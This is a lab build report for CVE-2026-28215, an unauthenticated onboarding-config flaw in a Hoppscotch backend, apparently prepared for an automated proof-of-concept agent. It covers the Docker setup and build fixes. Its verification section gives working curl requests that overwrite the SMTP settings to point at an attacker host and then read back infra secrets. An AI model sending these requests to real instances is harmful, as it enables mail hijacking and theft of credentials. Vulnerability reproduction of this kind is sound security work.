# Lab Build Report: CVE-2026-28215

## CVE ID
CVE-2026-28215

## Lab Architecture

**Multi-container Docker Compose lab** with two services:

| Container | Role | Image | Port |
|-----------|------|-------|------|
| `cve-2026-28215-db` | PostgreSQL 15 database | `postgres:15-bookworm` | 5432 (internal) |
| `cve-2026-28215-vulnerable` | Hoppscotch backend v2026.1.1 (vulnerable) | Custom build from source | 3170 (internal) |

**Network**: `lab_lab-net` (bridge) — containers communicate via Docker DNS.

**Architecture rationale**: Multi-container because the Hoppscotch backend connects to PostgreSQL via configurable `DATABASE_URL` (host:port), making Docker Compose networking the natural fit.

## Container Details

### PostgreSQL Database (`cve-2026-28215-db`)
- **Image**: `postgres:15-bookworm`
- **Credentials**: user=`postgres`, password=`testpass`, database=`hoppscotch`
- **Healthcheck**: `pg_isready -U postgres -d hoppscotch` (3s interval)
- **Data**: Ephemeral (no persistent volumes — lab resets on `docker compose down -v`)

### Hoppscotch Backend (`cve-2026-28215-vulnerable`)
- **Base**: `node:22-bookworm` (builder) / `node:22-bookworm-slim` (runtime)
- **Source version**: Tag `2026.1.1` (commit `ff906b7c`)
- **Build system**: pnpm 10 + NestJS CLI (`nest build`)
- **Port**: 3170 (backend REST/GraphQL API)
- **Restart policy**: `unless-stopped` (required — the app self-restarts after InfraConfig initialization on first boot, and after each `POST /v1/onboarding/config` call)
- **Key environment variables**:
  - `DATABASE_URL`: PostgreSQL connection string
  - `DATA_ENCRYPTION_KEY`: 32-char encryption key for secrets in DB
  - `WHITELISTED_ORIGINS`: CORS origins (`*` for lab)
  - `VITE_BASE_URL`: Frontend URL (required for `determineAllowSecureCookies`)
  - `MAILER_SMTP_ENABLE`: `false` (no actual SMTP server in lab)

### Networking Note (Docker-in-Docker)
The lab runs as sibling containers on the host Docker daemon. To reach the vulnerable container from the host:
```bash
# Option 1: Connect to the lab-net network
docker network connect lab-net cve-2026-28215-vulnerable
VULN_IP=$(docker inspect cve-2026-28215-vulnerable --format '{{(index .NetworkSettings.Networks "lab-net").IPAddress}}')
curl "http://${VULN_IP}:3170/v1/onboarding/status"

# Option 2: Use docker exec (always works)
docker exec cve-2026-28215-vulnerable node -e "
const http = require('http');
http.get('http://localhost:3170/v1/onboarding/status', (res) => {
  let d=''; res.on('data',c=>d+=c); res.on('end',()=>console.log(d));
});"
```

## Build Status

| Component | Status | Notes |
|-----------|--------|-------|
| PostgreSQL 15 | ✅ Built (pre-built image) | Standard `postgres:15-bookworm` |
| Hoppscotch Backend | ✅ Built from source | Multi-stage: builder + slim runtime |
| Prisma Migrations | ✅ Run at container start | 19 migrations applied successfully |
| NestJS Application | ✅ Running on port 3170 | Starts after init restart cycle |

### Build Workarounds Applied

1. **Node.js version upgrade**: Changed from `node:20.12.2` (in project's Dockerfile) to `node:22` — Prisma 7.x's `@prisma/dev` package uses ESM-only imports incompatible with Node 20's CommonJS loader.

2. **Postinstall script modification**: The backend's `postinstall` script runs `prisma generate && generate-gql-sdl`. The `generate-gql-sdl` command starts the full NestJS app (to emit GraphQL schema), which fails without a database. Fixed by stripping it from postinstall at build time:
   ```dockerfile
   RUN node -e "const fs=require('fs'); const p=JSON.parse(fs.readFileSync('package.json','utf8')); p.scripts.postinstall='cross-env DATABASE_URL=postgresql://x:x@localhost/x prisma generate'; fs.writeFileSync('package.json',JSON.stringify(p,null,2));"
   ```

3. **Prisma config file**: `prisma.config.ts` (Prisma 7.x config format) must be copied to the production stage — it defines the `datasource.url` via `env('DATABASE_URL')`, which is required by `prisma migrate deploy`.

4. **OpenSSL installation**: Added `openssl` to the slim runtime image — Prisma engine detection requires it.

5. **Entry point path**: NestJS builds to `dist/src/main.js` (not `dist/main.js`) because `prisma.config.ts` at the project root shifts TypeScript's computed `rootDir`. The entrypoint script handles both paths.

6. **Restart policy**: `unless-stopped` is required because the Hoppscotch backend calls `stopApp()` (process.exit) after:
   - First-boot InfraConfig table initialization
   - Every `POST /v1/onboarding/config` call (config update triggers app restart)

## Start/Stop Commands

```bash
# Start the lab
cd CVE-2026-28215
docker compose up -d

# Wait for initialization (first boot takes ~25s: DB ready → migrations → app init → restart → stable)
sleep 25

# Connect to lab network for direct HTTP access
docker network connect lab-net cve-2026-28215-vulnerable

# Check status
docker compose ps

# View logs
docker compose logs vulnerable

# Stop the lab
docker compose down

# Full reset (remove database data)
docker compose down -v
```

## Verification Evidence

### 1. Containers Running
```
NAME                        IMAGE                  STATUS                   PORTS
cve-2026-28215-db           postgres:15-bookworm   Up 6 minutes (healthy)   5432/tcp
cve-2026-28215-vulnerable   lab-vulnerable         Up (running)             3170/tcp
```

### 2. Onboarding Status Endpoint (GET /v1/onboarding/status)
```json
{"onboardingCompleted":false,"canReRunOnboarding":true}
```
→ Unauthenticated, returns instance configuration status.

### 3. Exploit: Config Overwrite (POST /v1/onboarding/config)
```bash
curl -X POST http://<target>:3170/v1/onboarding/config \
  -H "Content-Type: application/json" \
  -d '{"VITE_ALLOWED_AUTH_PROVIDERS":"EMAIL","MAILER_SMTP_ENABLE":"true","MAILER_USE_CUSTOM_CONFIGS":"true","MAILER_SMTP_HOST":"evil-smtp.attacker.com","MAILER_SMTP_PORT":"587","MAILER_SMTP_SECURE":"true","MAILER_SMTP_USER":"evil@attacker.com","MAILER_SMTP_PASSWORD":"evil-password-123","MAILER_ADDRESS_FROM":"noreply@attacker.com","MAILER_TLS_REJECT_UNAUTHORIZED":"true"}'
```
**Response**: `201 Created`
```json
{"token":"ed5f7f52-1f76-48f8-b76e-e6f7e04064c0"}
```
→ **Unauthenticated!** Config overwritten, recovery token returned.

### 4. Secret Exfiltration (GET /v1/onboarding/config?token=<token>)
```bash
curl "http://<target>:3170/v1/onboarding/config?token=ed5f7f52-1f76-48f8-b76e-e6f7e04064c0"
```
**Response**: `200 OK`
```json
{
  "VITE_ALLOWED_AUTH_PROVIDERS": "EMAIL",
  "MAILER_SMTP_HOST": "evil-smtp.attacker.com",
  "MAILER_SMTP_USER": "evil@attacker.com",
  "MAILER_SMTP_PASSWORD": "evil-password-123",
  "GOOGLE_CLIENT_ID": "",
  "GOOGLE_CLIENT_SECRET": "",
  ...
}
```
→ All infra secrets exposed, including attacker-controlled SMTP config.

### 5. Post-Exploit Status
```json
{"onboardingCompleted":true,"canReRunOnboarding":true}
```
→ `canReRunOnboarding: true` because no users exist (lab state). In production with users, the **patched version** would block with `400 onboarding/cannot_be_rerun`, but the **vulnerable version** has no such check.

## Behavioral Notes for PoC Agent

1. **App restarts after each POST exploit**: The `POST /v1/onboarding/config` triggers `stopApp()` which kills the process. Docker's `unless-stopped` policy restarts it. **Wait ~10-15 seconds** after the POST before sending the GET to exfiltrate secrets.

2. **No curl in container**: The slim runtime image doesn't have curl. Use `docker exec` with Node.js `http` module for testing, or use localhost with mapped port 3170.

3. **Initial state**: On first boot, `onboardingCompleted: false`. After the first `POST /v1/onboarding/config`, it becomes `true`. The vulnerability is that this POST can be repeated without authentication.

4. **For patched comparison**: Checkout `2026.2.0` tag, rebuild with the same Dockerfile. The patched version will return `400` on the second POST when `onboardingCompleted=true && usersCount > 0`.

## Known Issues

1. **First-boot restart cycle**: The container restarts once during first boot (~25s total startup). This is expected Hoppscotch behavior (InfraConfig table initialization triggers app restart).

2. **Container restart after exploit**: Each successful `POST /v1/onboarding/config` triggers an app restart (by design in Hoppscotch — config changes require restart). The `unless-stopped` policy handles this, but the PoC must account for the ~10-15s downtime.

3. **No SMTP server**: The lab doesn't include an SMTP server. The PoC demonstrates config overwrite and secret exfiltration, not actual email interception. A real attack scenario would redirect SMTP to an attacker-controlled server.

## Files

| File | Purpose |
|------|---------|
| `Dockerfile.vulnerable` | Multi-stage Dockerfile for Hoppscotch backend v2026.1.1 |
| `docker-compose.yml` | Compose orchestration (PostgreSQL + backend) |
| `entrypoint.sh` | Container entrypoint (DB wait → migrations → app start) |
